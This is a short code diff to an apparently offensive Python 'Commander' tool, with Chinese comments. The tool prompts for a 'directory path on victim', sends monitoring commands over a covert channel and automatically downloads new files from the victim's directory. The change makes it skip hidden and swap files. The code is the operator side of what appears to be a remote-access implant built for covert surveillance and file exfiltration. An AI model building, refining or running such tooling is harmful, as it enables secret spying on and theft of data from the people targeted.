@@ -385,7 +385,7 @@ def cmd_monitor_file(comm: Commander):
 
 def cmd_monitor_dir(comm: Commander):
     dir_path = input("Enter directory path on victim to monitor: ").strip()
-    print(f"[Commander] 开始监控目录：{dir_path}（仅根目录文件，不含子目录；新增文件时下载）")
+    print(f"[Commander] 开始监控目录：{dir_path}（仅根目录文件；新增文件时下载，忽略隐藏/Swap 文件）")
     comm.send_covert_message(f"CMD_MON_DIR:{dir_path}".encode())
 
     try:
@@ -404,8 +404,13 @@ def cmd_monitor_dir(comm: Commander):
             basepath = msg.get('path', '')
             fname    = msg.get('filename', '')
 
-            # 只有新增文件时才下载
+            # 只有真正的“新增文件”事件才下载，且过滤隐藏/Swap 文件
             if typ == "MON_DIR_ADDED" and basepath and fname:
+                # 跳过隐藏文件（以 . 开头）和 Vim swap 文件（.swp）
+                if fname.startswith('.') or fname.endswith('.swp'):
+                    # print(f"[DEBUG] 忽略文件：{fname}")
+                    continue
+
                 full_path = os.path.join(basepath, fname)
                 print(f"[{msg.get('timestamp','')}] 目录中新文件：{full_path}")
                 try:
@@ -418,6 +423,7 @@ def cmd_monitor_dir(comm: Commander):
     except KeyboardInterrupt:
         print("\n[*] 停止目录监控。")
         comm.send_covert_message(b"CMD_STOP_MON_DIR")
+
 
 
 
